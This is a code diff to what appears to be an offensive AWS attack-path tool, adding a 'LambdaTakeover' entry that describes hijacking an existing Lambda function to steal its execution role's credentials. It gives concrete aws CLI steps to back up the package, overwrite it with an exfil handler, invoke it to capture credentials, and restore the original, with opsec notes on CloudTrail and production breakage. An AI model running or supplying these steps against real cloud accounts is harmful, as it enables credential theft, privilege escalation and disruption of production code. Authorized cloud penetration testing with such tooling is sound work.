@@ -12,7 +12,7 @@ from ..models import AbuseInfo, AbuseStep, BlastRadius, Platform
 ABUSE_DB: dict[str, AbuseInfo] = {}
 
 
-def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> AbuseStep:
+def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="", is_cleanup=False) -> AbuseStep:
     return AbuseStep(
         description=desc,
         command=cmd,
@@ -21,6 +21,7 @@ def _s(desc, cmd, api="", blast=BlastRadius.READ, tool="aws", opsec="") -> Abuse
         blast_radius=blast,
         api=api,
         opsec_note=opsec,
+        is_cleanup=is_cleanup,
     )
 
 
@@ -307,6 +308,63 @@ ABUSE_DB["UpdateLambdaCode"] = AbuseInfo(
             "  --zip-file fileb://payload.zip",
             api="lambda:UpdateFunctionCode",
             blast=BlastRadius.DESTRUCTIVE,
+        ),
+    ],
+)
+
+
+# ─── LambdaTakeover ─────────────────────────────────────────────────────────
+
+ABUSE_DB["LambdaTakeover"] = AbuseInfo(
+    edge_kind="LambdaTakeover",
+    description=(
+        "Hijack an EXISTING Lambda function you can update+invoke to steal its "
+        "execution role's credentials. Back up the current package, overwrite the "
+        "code with an exfil handler, invoke it to read the role's ambient creds, "
+        "then restore the original package. Yields the execution role WITHOUT "
+        "PassRole. Requires lambda:GetFunction (to back up), UpdateFunctionCode, "
+        "and InvokeFunction on the specific function; ZIP/Python runtimes only."
+    ),
+    required_permissions=[
+        "lambda:GetFunction", "lambda:UpdateFunctionCode", "lambda:InvokeFunction",
+    ],
+    source_kinds=["IAMUser", "IAMRole"],
+    target_kinds=["IAMRole"],
+    blast_radius=BlastRadius.DESTRUCTIVE,
+    opsec_considerations=(
+        "Overwrites production code - the function is broken between the overwrite "
+        "and the restore. The strategy restores immediately after capture and, on "
+        "a failed restore, leaves a ledger entry so `awspwn rollback` reloads the "
+        "backed-up package from disk. CloudTrail records UpdateFunctionCode + "
+        "Invoke; the injected code runs on the function's normal path."
+    ),
+    linux_steps=[
+        _s(
+            "Back up the current deployment package",
+            "aws lambda get-function {AWS_AUTH} --function-name '{FUNCTION_NAME}' \\\n"
+            "  --query 'Code.Location' --output text | xargs curl -s -o backup.zip",
+            api="lambda:GetFunction",
+        ),
+        _s(
+            "Overwrite the code with an exfil handler (matching the runtime/handler)",
+            "aws lambda update-function-code {AWS_AUTH} \\\n"
+            "  --function-name '{FUNCTION_NAME}' --zip-file fileb://exfil.zip",
+            api="lambda:UpdateFunctionCode",
+            blast=BlastRadius.DESTRUCTIVE,
+        ),
+        _s(
+            "Invoke to capture the execution role's credentials",
+            "aws lambda invoke {AWS_AUTH} --function-name '{FUNCTION_NAME}' out.json",
+            api="lambda:InvokeFunction",
+            blast=BlastRadius.MUTATE,
+        ),
+        _s(
+            "Restore the original package",
+            "aws lambda update-function-code {AWS_AUTH} \\\n"
+            "  --function-name '{FUNCTION_NAME}' --zip-file fileb://backup.zip",
+            api="lambda:UpdateFunctionCode",
+            blast=BlastRadius.DESTRUCTIVE,
+            is_cleanup=True,
         ),
     ],
 )
